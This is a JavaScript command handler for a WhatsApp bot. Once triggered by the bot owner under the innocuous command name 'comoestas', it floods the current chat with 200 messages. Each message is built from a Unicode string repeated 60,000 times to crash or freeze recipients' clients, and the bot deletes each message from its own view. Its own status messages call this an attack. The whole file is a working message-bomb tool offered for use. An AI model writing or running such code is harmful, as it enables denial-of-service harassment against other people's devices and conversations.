let handler = async (m, { conn }) => {
  if (!m.fromMe) return; // Solo el bot puede usarlo

  const target = m.chat;
  const pushname = conn.getName(m.sender);
  const mensaje = "🧪‌⃰Ꮡ‌‌" + "⛧ Zall :: CONCƱΣЯЯOR ⛧" +
    "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  const mensajesTotales = 200;
  const mensajesPorTanda = 20;
  let enviados = 0;

  await conn.sendMessage(m.chat, { text: "⏳ Iniciando ataque: 200 mensajes en tandas de 20..." }, { quoted: m });

  try {
    while (enviados < mensajesTotales) {
      for (let i = 0; i < mensajesPorTanda; i++) {
        const msg = await conn.sendMessage(target, {
          text: mensaje,
          contextInfo: {
            externalAdReply: {
              title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
              body: `Haii ${pushname}`,
              previewType: "PHOTO",
              thumbnail: null,
              sourceUrl: "https://example.com/tama"
            }
          }
        }, { quoted: m });

        // Eliminar localmente para el bot
        await conn.sendMessage(conn.user.id, {
          delete: {
            remoteJid: msg.key.remoteJid,
            fromMe: true,
            id: msg.key.id,
            participant: msg.key.participant
          }
        });

        enviados++;
        await delay(300); // Pausa entre cada mensaje
      }

      await delay(1500); // Pausa entre tandas
    }

    await conn.sendMessage(m.chat, { text: "✅ Ataque finalizado: 200 mensajes enviados" }, { quoted: m });

  } catch (e) {
    await conn.sendMessage(m.chat, { text: "❌ Error al ejecutar ataque:\n" + e.message }, { quoted: m });
  }
};

handler.command = ["comoestas"];
handler.rowner = true;
export default handler;